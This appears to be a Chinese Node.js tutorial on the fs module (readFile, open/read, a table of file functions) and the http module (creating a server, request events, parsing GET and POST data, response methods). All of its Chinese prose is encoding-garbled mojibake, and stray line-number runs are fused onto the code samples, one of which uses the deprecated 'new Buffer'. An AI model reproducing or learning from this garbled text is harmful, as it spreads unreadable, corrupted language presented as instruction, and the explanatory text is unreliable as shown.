æ¨¡å—ä¸­æ‰€æœ‰çš„æ“ä½œéƒ½æä¾›äº†å¼‚æ­¥çš„å’ŒåŒæ­¥çš„ä¸¤ä¸ªç‰ˆæœ¬ã€‚ä¾‹å¦‚è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°æœ‰å¼‚æ­¥çš„ fs.readFile() å’ŒåŒæ­¥çš„ fs.readFileSync() fs.readFilefs.readFile(filename,[encoding],[callback(err,data)])æ˜¯æœ€ç®€å•çš„è¯»å–æ–‡ä»¶çš„å‡½æ•°ã€‚ fliename å¿…é€‰å‚æ•°ï¼Œè¡¨ç¤ºè¯»å–çš„æ–‡ä»¶å encoding å¯é€‰ï¼Œè¡¨ç¤ºæ–‡ä»¶çš„å­—ç¬¦ç¼–ç  callback å›žè°ƒå‡½æ•°æä¾›ä¸¤ä¸ªå‚æ•° err å’Œ dataï¼Œerrè¡¨ç¤ºæœ‰æ²¡æœ‰é”™å‘ç”Ÿï¼Œ data æ˜¯æ–‡ä»¶å†…å®¹ã€‚å¦‚æžœæŒ‡å®šäº† encoding,data æ˜¯ä¸€ä¸ªè§£æžåŽçš„å­—ç¬¦ä¸²ï¼Œå¦åˆ™ data å°†ä¼šæ˜¯ä»¥ Buffer å½¢å¼è¡¨ç¤ºçš„äºŒè¿›åˆ¶æ•°æ®ã€‚ ä¸‹é¢çš„ä¾‹å­è¯»å–æ–‡æœ¬å†…å®¹ï¼Œä½†æ˜¯ä¸æŒ‡å®šç¼–ç  123456789// fs.readFilevar fs = require('fs');fs.readFile('content.txt',function(err, data)&#123; if(err)&#123; console.log(err); &#125;else &#123; console.log(data); &#125;&#125;); è¿è¡Œç»“æžœï¼š 12C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.js&lt;Buffer 54 65 78 74 20 e6 96 87 e6 9c ac e6 96 87 e4 bb b6 e7 a4 ba e4 be 8b&gt; è¿™ä¸ªç¨‹åºä»¥äºŒè¿›åˆ¶çš„æ¨¡å¼è¯»å–äº†æ–‡ä»¶çš„å†…å®¹ï¼Œ data çš„å€¼æ˜¯ Buffer çš„å¯¹è±¡ã€‚å¦‚æžœæŒ‡å®šäº† encoding æŒ‡å®šç¼–ç  123456789// fs.readFilevar fs = require('fs');fs.readFile('content.txt','utf-8',function(err, data)&#123; if(err)&#123; console.log(err); &#125;else &#123; console.log(data); &#125;&#125;); è¿è¡Œç»“æžœ 12C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.jsText æ–‡æœ¬æ–‡ä»¶ç¤ºä¾‹ å½“è¯»å–æ–‡ä»¶å‡ºçŽ°é”™è¯¯æ—¶ï¼Œ err å°†ä¼šæ˜¯ Error å¯¹è±¡ã€‚å¦‚æžœ content.text ä¸å­˜åœ¨ï¼Œè¿è¡Œå‰é¢çš„ä»£ç åˆ™ä¼šå‡ºçŽ°ä»¥ä¸‹ç»“æžœï¼š 1234567C:\Users\Administrator\Desktop\nodeJs&gt;node fs.readFile.js&#123; Error: ENOENT: no such file or directory, open 'C:\Users\Administrator\Desktop\nodeJs\content.text' errno: -4058, code: 'ENOENT', syscall: 'open', path: 'C:\\Users\\Administrator\\Desktop\\nodeJs\\content.text' &#125; Node.js çš„å¼‚æ­¥ç¼–ç¨‹æŽ¥å£ä¹ æƒ¯æ˜¯ä»¥å‡½æ•°çš„æœ€åŽä¸€ä¸ªå‚æ•°ä¸ºå›žè°ƒå‡½æ•°ï¼Œé€šå¸¸ä¸€ä¸ªå‡½æ•°åªæœ‰ä¸€ä¸ªå›žè°ƒå‡½æ•°ã€‚å›žè°ƒå‡½æ•°æ˜¯å®žé™…å‚æ•°ä¸­ç¬¬ä¸€ä¸ªæ˜¯ err ï¼Œå…¶ä½™çš„å‚æ•°æ˜¯å…¶ä»–è¿”å›žçš„å†…å®¹ã€‚å¦‚æžœæ²¡æœ‰å‘ç”Ÿé”™è¯¯ï¼Œ err çš„å€¼ä¼šæ˜¯ null æˆ– undefined ã€‚å¦‚æžœæœ‰é”™è¯¯å‘ç”Ÿï¼Œ err é€šå¸¸æ˜¯ Error å¯¹è±¡çš„å®žä¾‹ã€‚ fs.readFileSyncfs.readFileSync(filename, [encoding]) æ˜¯ fs.readFile åŒæ­¥ç‰ˆæœ¬ã€‚å®ƒæŽ¥å—çš„å‚æ•°å’Œ fs.readFile ç›¸åŒï¼Œè€Œè¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹ä¼šä»¥å‡½æ•°è¿”å›žå€¼çš„å½¢å¼è¿”å›žã€‚å¦‚æžœæœ‰é”™è¯¯å‘ç”Ÿï¼Œ fs å°†ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä½ éœ€è¦ä½¿ç”¨ try å’Œ catch æ•æ‰å¹¶å¤„ç†å¼‚å¸¸ã€‚ ä¸ŽåŒæ­¥ I/O å‡½æ•°ä¸åŒï¼ŒNode.js ä¸­å¼‚æ­¥å‡½æ•°å¤§å¤šæ²¡æœ‰è¿”å›žå€¼ã€‚ fs.openfs.open(path, flags, [mode], [callback(err, fd)]) æ˜¯ POSIX open å‡½æ•°çš„å°è£…ï¼Œä¸Ž C è¯­è¨€æ ‡å‡†åº“ä¸­çš„ fopen å‡½æ•°ç±»ä¼¼ã€‚å®ƒæŽ¥å—ä¸¤ä¸ªå¿…é€‰å‚æ•°ï¼Œ path ä¸ºæ–‡ä»¶çš„è·¯å¾„ï¼Œflags å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ã€‚ r ï¼šä»¥è¯»å–æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚ r+ ï¼šä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚ w ï¼šä»¥å†™å…¥æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚ w+ ï¼šä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚ a ï¼šä»¥è¿½åŠ æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚ a+ ï¼šä»¥è¯»å–è¿½åŠ æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨åˆ™åˆ›å»ºã€‚ mode å‚æ•°ç”¨äºŽåˆ›å»ºæ–‡ä»¶æ—¶ç»™æ–‡ä»¶æŒ‡å®šæƒé™ï¼Œé»˜è®¤æ˜¯ 0666ã€‚å›žè°ƒå‡½æ•°å°†ä¼šä¼ é€’ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fdã€‚ fs.readfs.read(fd, buffer, offset, length, position, [callback(err, bytesRead, buffer)]) æ˜¯ POSIX read å‡½æ•°çš„å°è£…ï¼Œç›¸æ¯” fs.readFile æä¾›äº†æ›´åº•å±‚çš„æŽ¥å£ã€‚ fs.readçš„åŠŸèƒ½æ˜¯ä»ŽæŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ fd ä¸­è¯»å–æ•°æ®å¹¶å†™å…¥ buffer æŒ‡å‘çš„ç¼“å†²åŒºå¯¹è±¡ã€‚ offset æ˜¯ buffer çš„å†™å…¥åç§»é‡ã€‚ length æ˜¯è¦ä»Žæ–‡ä»¶ä¸­è¯»å–çš„å­—èŠ‚æ•°ã€‚ position æ˜¯æ–‡ä»¶è¯»å–çš„èµ·å§‹ä½ç½®ï¼Œå¦‚æžœ position çš„å€¼ä¸º null ï¼Œåˆ™ä¼šä»Žå½“å‰æ–‡ä»¶æŒ‡é’ˆçš„ä½ç½®è¯»å–ã€‚ callback å›žè°ƒå‡½æ•°ä¼ é€’ bytesRead å’Œ buffer ï¼Œåˆ†åˆ«è¡¨ç¤ºè¯»å–çš„å­—èŠ‚æ•°å’Œç¼“å†²åŒºå¯¹è±¡ã€‚ ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ fs.open å’Œ fs.read çš„ç¤ºä¾‹ã€‚ 1234567891011121314151617// fs.readvar fs = require('fs');fs.open('content.txt', 'r', function(err, fd) &#123; if (err) &#123; console.log(err); return; &#125; var buf = new Buffer(8); fs.read(fd, buf, 0, 8, null, function(err, bytesRead, buffer) &#123; if (err) &#123; console.log(err); return; &#125; console.log('bytesRead:' + bytesRead); console.log(buffer); &#125;)&#125;); è¿è¡Œç»“æžœï¼š 123C:\Users\Administrator\Desktop\nodeJs&gt;node fs.read.jsbytesRead:8&lt;Buffer 54 65 78 74 20 e6 96 87&gt; ä¸€èˆ¬æ¥è¯´ï¼Œé™¤éžå¿…è¦ï¼Œå¦åˆ™ä¸è¦ä½¿ç”¨è¿™ç§æ–¹å¼è¯»å–æ–‡ä»¶ï¼Œå› ä¸ºå®ƒè¦æ±‚ä½ æ‰‹åŠ¨ç®¡ç†ç¼“å†²åŒºå’Œæ–‡ä»¶æŒ‡é’ˆï¼Œå°¤å…¶æ˜¯åœ¨ä½ ä¸çŸ¥é“æ–‡ä»¶å¤§å°çš„æ—¶å€™ï¼Œè¿™å°†ä¼šæ˜¯ä¸€ä»¶å¾ˆéº»çƒ¦çš„äº‹æƒ… ä¸‹è¡¨åˆ—å‡ºäº† fs æ‰€æœ‰å‡½æ•°çš„å®šä¹‰å’ŒåŠŸèƒ½ åŠŸ èƒ½ å¼‚æ­¥å‡½æ•° åŒæ­¥å‡½æ•° æ‰“å¼€æ–‡ä»¶ fs.open(path,flags, [mode], [callback(err,fd)]) fs.openSync(path, flags, [mode]) å…³é—­æ–‡ä»¶ fs.close(fd, [callback(err)]) fs.closeSync(fd) è¯»å–æ–‡ä»¶ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ fs.read(fd,buffer,offset,length,position,[callback(err, bytesRead, buffer)]) fs.readSync(fd, buffer, offset,length, position) å†™å…¥æ–‡ä»¶ï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ fs.write(fd,buffer,offset,length,position,[callback(err, bytesWritten, buffer)]) fs.writeSync(fd, buffer, offset,length, position) è¯»å–æ–‡ä»¶å†…å®¹ fs.readFile(filename,[encoding],[callback(err, data)]) fs.readFileSync(filename,[encoding]) å†™å…¥æ–‡ä»¶å†…å®¹ fs.writeFile(filename, data,[encoding],[callback(err)]) fs.writeFileSync(filename, data,[encoding]) åˆ é™¤æ–‡ä»¶ fs.unlink(path, [callback(err)]) fs.unlinkSync(path) åˆ›å»ºç›®å½• fs.mkdir(path, [mode], [callback(err)]) fs.mkdirSync(path, [mode]) åˆ é™¤ç›®å½• fs.rmdir(path, [callback(err)]) fs.rmdirSync(path) è¯»å–ç›®å½• fs.readdir(path, [callback(err, files)]) fs.readdirSync(path) èŽ·å–çœŸå®žè·¯å¾„ fs.realpath(path, [callback(err,resolvedPath)]) fs.realpathSync(path) æ›´å fs.rename(path1, path2, [callback(err)]) fs.renameSync(path1, path2) æˆªæ–­ fs.truncate(fd, len, [callback(err)]) fs.truncateSync(fd, len) æ›´æ”¹æ‰€æœ‰æƒ fs.chown(path, uid, gid, [callback(err)]) fs.chownSync(path, uid, gid) æ›´æ”¹æ‰€æœ‰æƒï¼ˆæ–‡ä»¶æè¿°ç¬¦ï¼‰ fs.fchown(fd, uid, gid, [callback(err)]) fs.fchownSync(fd, uid, gid) æ›´æ”¹æ‰€æœ‰æƒï¼ˆä¸è§£æžç¬¦å·é“¾æŽ¥ï¼‰ fs.lchown(path, uid, gid, [callback(err)]) fs.lchownSync(path, uid, gid) æ›´æ”¹æƒé™ fs.chmod(path, mode, [callback(err)]) fs.chmodSync(path, mode) èŽ·å–æ–‡ä»¶ä¿¡æ¯ fs.stat(path, [callback(err, stats)]) fs.statSync(path) åˆ›å»ºç¡¬é“¾æŽ¥ fs.link(srcpath, dstpath, [callback(err)]) fs.linkSync(srcpath, dstpath) åˆ›å»ºç¬¦å·é“¾æŽ¥ fs.symlink(linkdata, path, [type],[callback(err)]) fs.symlinkSync(linkdata, path,[type]) è¯»å–é“¾æŽ¥ fs.readlink(path, [callback(err,linkString)]) fs.readlinkSync(path) ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³ fs.utimes(path, atime, mtime, [callback(err)]) fs.utimesSync(path, atime, mtime) åŒæ­¥ç£ç›˜ç¼“å­˜ fs.fsync(fd, [callback(err)]) fs.fsyncSync(fd) HTTP æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯Node.js æ ‡å‡†åº“æä¾›äº† http æ¨¡å—ï¼Œå…¶ä¸­å°è£…äº†ä¸€ä¸ªé«˜æ•ˆçš„ HTTP æœåŠ¡å™¨å’Œä¸€ä¸ªå»ºè®®çš„ HTTP å®¢æˆ·ç«¯ã€‚http.server æ˜¯ä¸€ä¸ªåŸºäºŽäº‹ä»¶çš„ HTTP æœåŠ¡å™¨ï¼Œå®ƒçš„æ ¸å¿ƒç”± Node.js ä¸‹å±‚ C++ éƒ¨åˆ†å®žçŽ°ï¼Œè€ŒæŽ¥å£ç”± JavaScript å°è£…ï¼Œå…¼é¡¾äº†é«˜æ€§èƒ½ä¸Žç®€æ˜“æ€§ã€‚ http.request åˆ™æ˜¯ä¸€ä¸ª HTTP å®¢æˆ·ç«¯å·¥å…·ï¼Œç”¨äºŽå‘ HTTP æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œä¾‹å¦‚å®žçŽ°å†…å®¹æŠ“å–ã€‚ HTTP æœåŠ¡å™¨http.Server æ˜¯ http æ¨¡å—ä¸­çš„ HTTP æœåŠ¡å™¨å¯¹è±¡ï¼Œç”¨ Node.js åšçš„æ‰€æœ‰åŸºäºŽ HTTP åè®®çš„ç³»ç»Ÿï¼Œå¦‚ç½‘ç«™ã€ç¤¾äº¤åº”ç”¨ç”šè‡³ä»£ç†æœåŠ¡å™¨ï¼Œéƒ½æ˜¯åŸºäºŽ http.Server å®žçŽ°çš„ã€‚å®ƒæä¾›äº†ä¸€å¥—å°è£…çº§åˆ«å¾ˆä½Žçš„ APIï¼Œä»…ä»…æ˜¯æµæŽ§åˆ¶å’Œç®€å•çš„æ¶ˆæ¯è§£æžï¼Œæ‰€æœ‰çš„é«˜å±‚åŠŸèƒ½éƒ½è¦é€šè¿‡å®ƒçš„æŽ¥å£æ¥å®žçŽ°ã€‚ http æœåŠ¡å™¨çš„å®žçŽ°åœ¨ä¸Šä¸€èŠ‚æœ‰å®žçŽ°è¿‡ 1234567891011// app.jsvar http = require('http');http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;).listen(3000);console.log("HTTP server is listening at port 3000."); è¿™æ®µä»£ç ä¸­ï¼Œhttp.createServer åˆ›å»ºäº†ä¸€ä¸ª http.Server çš„å®žä¾‹ï¼Œè®²ä¸€ä¸ªå‡½æ•°ä½œä¸º HTTP è¯·æ±‚å¤„ç†å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯è¯·æ±‚å¯¹è±¡ï¼ˆreqï¼‰å’Œå“åº”å¯¹è±¡ï¼ˆresï¼‰ã€‚åœ¨å‡½æ•°å†…ï¼Œres æ˜¾å¼åœ°å†™å›žäº† å“åº”ä»£ç  200ï¼ˆè¡¨ç¤ºè¯·æ±‚æˆåŠŸï¼‰ï¼ŒæŒ‡å®šäº†å“åº”å¤´ä¸º Content-typeï¼štext/htmlï¼Œç„¶åŽè¿˜å†™å…¥äº†å“åº”ä½“&lt;h1&gt;Node.js&lt;/h1&gt;é€šè¿‡ res.end ç»“æŸå¹¶å‘é€ã€‚æœ€åŽè¯¥å®žä¾‹è¿˜è°ƒç”¨äº† listen å‡½æ•°ï¼Œå¯åŠ¨æœåŠ¡å™¨å¹¶ç›‘å¬ 3000 ç«¯å£ã€‚ http.Server çš„äº‹ä»¶http.Server æ˜¯ä¸€ä¸ªåŸºäºŽäº‹ä»¶çš„ HTTP æœåŠ¡å™¨ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½è¢«å°è£…ä¸ºç‹¬ç«‹çš„äº‹ä»¶ï¼Œå¼€å‘è€…åªéœ€è¦å¯¹å®ƒçš„äº‹ä»¶ç¼–å†™å“åº”å‡½æ•°å³å¯å®žçŽ° HTTP æœåŠ¡å™¨çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒç»§æ‰¿è‡ª EventEmitterï¼Œæä¾›äº†ä¸€ä¸‹å‡ ä¸ªäº‹ä»¶ã€‚ request ï¼šå½“å®¢æˆ·ç«¯è¯·æ±‚åˆ°æ¥æ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ï¼Œæä¾›ä¸¤ä¸ªå‚æ•° res å’Œ req ï¼Œåˆ†åˆ«æ˜¯ http.ServerRequest å’Œ http.ServerResponse çš„å®žä¾‹ï¼Œè¡¨ç¤ºè¯·æ±‚å’Œå“åº”ä¿¡æ¯ã€‚ connection : å½“ TCP è¿žæŽ¥å»ºç«‹æ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ï¼Œæä¾›ä¸€ä¸ªå‚æ•° socket ï¼Œä¸º net.Socket çš„å®žä¾‹ã€‚ connection äº‹ä»¶çš„ç²’åº¦è¦å¤§äºŽ request ï¼Œå› ä¸ºå®¢æˆ·ç«¯åœ¨ Keep-alive æ¨¡å¼ä¸‹å¯èƒ½ä¼šåŒä¸€ä¸ªè¿žæŽ¥å†…å‘é€å¤šæ¬¡è¯·æ±‚ã€‚ close : å½“æœåŠ¡å™¨å…³é—­æ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ã€‚æ³¨æ„ä¸æ˜¯åœ¨ç”¨æˆ·è¿žæŽ¥æ–­å¼€æ—¶ã€‚ é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ checkContinue ã€ upgrade ã€ clientError äº‹ä»¶ï¼Œé€šå¸¸æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒï¼Œåªæœ‰åœ¨å®žçŽ°å¤æ‚çš„ HTTP æœåŠ¡å™¨çš„æ—¶å€™æ‰ä¼šç”¨åˆ°ã€‚ åœ¨è¿™äº›äº‹ä»¶ä¸­ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯ request äº†ï¼Œå› æ­¤ http æä¾›äº†ä¸€ä¸ªæ·å¾„ï¼šhttp.createServer([requestListener]) ï¼ŒåŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨å¹¶å°†requestListener ä½œä¸º request äº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å‰é¢ä¾‹å­ä¸­ä½¿ç”¨çš„æ–¹æ³•ã€‚äº‹å®žä¸Šå®ƒæ˜¾å¼çš„å®žçŽ°æ–¹æ³•æ˜¯ï¼š 12345678910111213// httpserver.jsvar http = require('http');var server = new http.Server();server.on('request', function(req, res) &#123; res.writeHead('200', &#123; 'Content-Type': 'text/html' &#125;); res.write('&lt;h1&gt;Node.js&lt;/h1&gt;'); res.end('&lt;p&gt;Hello World&lt;/p&gt;');&#125;);server.listen(3000);console.log("HTTP server is listening at port 3000."); http.ServerRequesthttp.ServerRequestæ˜¯ HTTP è¯·æ±‚çš„ä¿¡æ¯ï¼Œä¸€èˆ¬æœ‰ http.Server çš„ request äº‹ä»¶å‘é€ï¼Œä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ï¼Œé€šå¸¸ç®€ç§°ä¸º request å’Œ reqã€‚ServerRequest æä¾›ä¸€äº›å±žæ€§ã€‚ data : å½“è¯·æ±‚ä½“æ•°æ®åˆ°æ¥æ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ã€‚è¯¥äº‹ä»¶æä¾›ä¸€ä¸ªå‚æ•° chunkï¼Œè¡¨ç¤ºæŽ¥æ”¶åˆ°çš„æ•°æ®ï¼Œå¦‚æžœè¯¥äº‹ä»¶æ²¡æœ‰è¢«ç›‘å¬ï¼Œé‚£ä¹ˆè¯·æ±‚ä½“æ²¡æœ‰è¢«ç›‘å¬ï¼Œé‚£ä¹ˆè¯·æ±‚ä½“å°±å°†ä¼šè¢«æŠ›å¼ƒï¼Œè¯¥äº‹ä»¶å¯èƒ½ä¼šè°ƒç”¨å¤šæ¬¡ã€‚ end ï¼š å½“è¯·æ±‚ä½“æ•°æ®ä¼ è¾“å®Œæˆæ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ï¼Œæ­¤åŽå°†ä¸ä¼šå†æœ‰æ•°æ®åˆ°æ¥ã€‚ close ï¼š ç”¨æˆ·å½“å‰è¯·æ±‚ç»“æŸæ—¶ï¼Œè¯¥äº‹ä»¶è¢«è§¦å‘ã€‚ä¸åŒäºŽ endï¼Œå¦‚æžœç”¨æˆ·å¼ºåˆ¶ç»ˆæ­¢äº†ä¼ è¾“ï¼Œä¹Ÿè¿˜æ˜¯ä¼šè°ƒç”¨ closeã€‚ åç§° å«ä¹‰ complete å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦å·²ç»å‘é€å®Œæˆ httpVersion HTTP åè®®ç‰ˆæœ¬ï¼Œé€šå¸¸æ˜¯1.0 æˆ–æ˜¯1.1 method HTTP è¯·æ±‚æ–¹æ³•ï¼Œå¦‚ GETã€POSTã€PUTã€DELETE ç­‰ url åŽŸå§‹çš„è¯·æ±‚è·¯åŠ²ï¼Œä¾‹å¦‚/static/image/x.jpg headers HTTP è¯·æ±‚å¤´ trailers HTTP è¯·æ±‚å°¾ï¼ˆä¸å¸¸è§ï¼‰ connection å½“å‰ HTTP è¿žæŽ¥å¥—æŽ¥å­—ï¼Œä¸º net.Socket çš„å®žä¾‹ socket connection å±žæ€§çš„åˆ«å client client å±žæ€§çš„åˆ«å èŽ·å– GET è¯·æ±‚å†…å®¹ http.ServerRequest æä¾›çš„å±žæ€§é‡Œé¢æ²¡æœ‰ç±»ä¼¼ PHP è¯­è¨€ä¸­çš„ $_GET æˆ–$_POST çš„å±žæ€§ï¼Œé‚£æˆ‘ä»¬å¦‚ä½•æŽ¥å—å®¢æˆ·ç«¯çš„è¡¨å•è¯·æ±‚å‘¢ï¼Ÿç”±äºŽ GET è¯·æ±‚ç›´æŽ¥è¢«åµŒå…¥åœ¨è·¯å¾„ä¸­ï¼ŒURLæ˜¯å®Œæ•´çš„è¯·æ±‚è·¯å¾„ï¼ŒåŒ…æ‹¬äº† ? åŽé¢çš„éƒ¨åˆ†ï¼Œå› æ­¤ä½ å¯ä»¥æ‰‹åŠ¨è§£æžåŽé¢çš„å†…å®¹ä½œä¸º GETè¯·æ±‚çš„å‚æ•°ã€‚Node.js çš„ url æ¨¡å—ä¸­çš„ parse å‡½æ•°æä¾›äº†è¿™ä¸ªåŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š 1234567891011// httpserverrequestget.jsvar http = require('http');var url = require('url');var util = require('util');http.createServer(function(req, res) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/plain' &#125;); res.end(util.inspect(url.parse(req.url, true)));&#125;).listen(3000); åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://127.0.0.1:3000/user?name=lbh&amp;email=544289495@qq.com å¯ä»¥çœ‹åˆ°æµè§ˆå™¨è¿”å›žçš„ç»“æžœï¼š 12345678910111213Url &#123; protocol: null, slashes: null, auth: null, host: null, port: null, hostname: null, hash: null, search: '?name=lbh&amp;email=544289495@qq.com', query: &#123; name: 'lbh', email: '544289495@qq.com' &#125;, pathname: '/user', path: '/user?name=lbh&amp;email=544289495@qq.com', href: '/user?name=lbh&amp;email=544289495@qq.com' &#125; å¯ä»¥çœ‹åˆ°ï¼Œ url.parse,åŽŸå§‹çš„pathè¢«è§£æžä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­ query å°±æ˜¯æˆ‘ä»¬æ‰€è°“çš„ GET è¯·æ±‚çš„å†…å®¹ï¼Œè€Œè·¯å¾„åˆ™æ˜¯ pathname ã€‚ èŽ·å– POST è¯·æ±‚å†…å®¹HTTP åè®® 1.1 ç‰ˆæœ¬æä¾›äº†8ç§æ ‡å‡†çš„è¯·æ±‚æ–¹æ³•ï¼Œå…¶ä¸­æœ€å¸¸è§çš„å°±æ˜¯ GET å’Œ POSTã€‚ç›¸æ¯”GET è¯·æ±‚æŠŠæ‰€æœ‰çš„å†…å®¹ç¼–ç åˆ°è®¿é—®è·¯å¾„ä¸­ï¼ŒPOST è¯·æ±‚çš„å†…å®¹å…¨éƒ¨éƒ½åœ¨è¯·æ±‚ä½“ä¸­ã€‚http.ServerRequest å¹¶æ²¡æœ‰ä¸€ä¸ªå±žæ€§å†…å®¹ä¸ºè¯·æ±‚ä½“ï¼ŒåŽŸå› æ˜¯ç­‰å¾…è¯·æ±‚ä½“ä¼ è¾“å¯èƒ½æ˜¯ä¸€ä»¶è€—æ—¶çš„å·¥ä½œï¼Œè­¬å¦‚ä¸Šä¼ æ–‡ä»¶ã€‚è€Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¯èƒ½å¹¶ä¸éœ€è¦ç†ä¼šè¯·æ±‚ä½“çš„å†…å®¹ï¼Œæ¶æ„çš„ POSTè¯·æ±‚ä¼šå¤§å¤§æ¶ˆè€—æœåŠ¡å™¨çš„èµ„æºã€‚æ‰€ä»¥ Node.js é»˜è®¤æ˜¯ä¸ä¼šè§£æžè¯·æ±‚ä½“çš„ï¼Œå½“ä½ éœ€è¦çš„æ—¶å€™ï¼Œéœ€è¦æ‰‹åŠ¨æ¥åšã€‚è®©æˆ‘ä»¬çœ‹çœ‹å®žçŽ°æ–¹æ³•ï¼š 1234567891011121314// httpserverrequestpost.jsvar http = require('http');var querystring = require('querystring');var util = require('util');http.createServer(function(req, res) &#123; var post = ''; req.on('data', function(chunk) &#123; post += chunk; &#125;); req.on('end', function() &#123; post = querystring.parse(post); res.end(util.inspect(post)); &#125;);&#125;).listen(3000); ä¸Šé¢ä»£ç å¹¶æ²¡æœ‰åœ¨è¯·æ±‚å“åº”å‡½æ•°ä¸­å‘å®¢æˆ·ç«¯è¿”å›žä¿¡æ¯ï¼Œè€Œæ˜¯å®šä¹‰äº†ä¸€ä¸ª post å˜é‡ï¼Œç”¨äºŽåœ¨é—­åŒ…ä¸­æš‚å­˜è¯·æ±‚ä½“çš„ä¿¡æ¯ã€‚é€šè¿‡ req çš„ data äº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œæ¯å½“æŽ¥å—åˆ°è¯·æ±‚ä½“çš„æ•°æ®ï¼Œå°±ç´¯åŠ åˆ° post å˜é‡ä¸­ã€‚åœ¨ end äº‹ä»¶è§¦å‘åŽï¼Œé€šè¿‡ querystring.parse å°† post è§£æžä¸ºçœŸæ­£çš„ POST è¯·æ±‚æ ¼å¼ï¼Œç„¶åŽå‘å®¢æˆ·ç«¯è¿”å›žã€‚ http.ServerResponsehttp.ServerResponse æ˜¯è¿”å›žç»™å®¢æˆ·ç«¯çš„ä¿¡æ¯ï¼Œå†³å®šäº†ç”¨æˆ·æœ€ç»ˆèƒ½çœ‹åˆ°çš„ç»“æžœã€‚å®ƒä¹Ÿæ˜¯ç”± http.Server çš„ request äº‹ä»¶å‘é€çš„ï¼Œä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’ï¼Œä¸€èˆ¬ç®€ç§°ä¸º response æˆ– res ã€‚http.ServerResponse æœ‰ä¸‰ä¸ªé‡è¦çš„æˆå‘˜å‡½æ•°ï¼Œç”¨äºŽè¿”å›žå“åº”å¤´ã€å“åº”å†…å®¹ä»¥åŠç»“æŸè¯·æ±‚ã€‚ response.writeHead(statusCode, [headers]) å‘è¯·æ±‚çš„å®¢æˆ·ç«¯å‘é€å“åº”å¤´ã€‚ statusCodeæ˜¯ HTTP çŠ¶æ€ç ï¼Œå¦‚200/404ç­‰ headers æ˜¯ä¸€ä¸ªç±»ä¼¼å…³è”æ•°ç»„çš„å¯¹è±¡ï¼Œè¡¨ç¤ºå“åº”å¤´çš„æ¯ä¸ªå±žæ€§ï¼Œè¯¥å‡½æ•°åœ¨ä¸€ä¸ªè¯·æ±‚å†…æœ€å¤šåªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œå¦‚æžœä¸è°ƒç”¨ï¼Œåˆ™ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå“åº”å¤´ã€‚ response.write(data, [encoding]) å‘è¯·æ±‚çš„å®¢æˆ·ç«¯å‘é€å“åº”å†…å®¹ã€‚ data æ˜¯ä¸€ä¸ª Bufferæˆ–å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºè¦å‘é€çš„å†…å®¹ã€‚å¦‚æžœ dataæ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦æŒ‡å®š encodingæ¥è¯´æ˜Žå®ƒçš„ç¼–ç æ–¹å¼ï¼Œé»˜è®¤æ˜¯ utf-8ã€‚å¦‚æžœåœ¨ response.end è°ƒç”¨ä¹‹å‰ï¼Œ response.write å¯ä»¥å¤šæ¬¡è°ƒç”¨ã€‚ response.end([data], [encoding]) 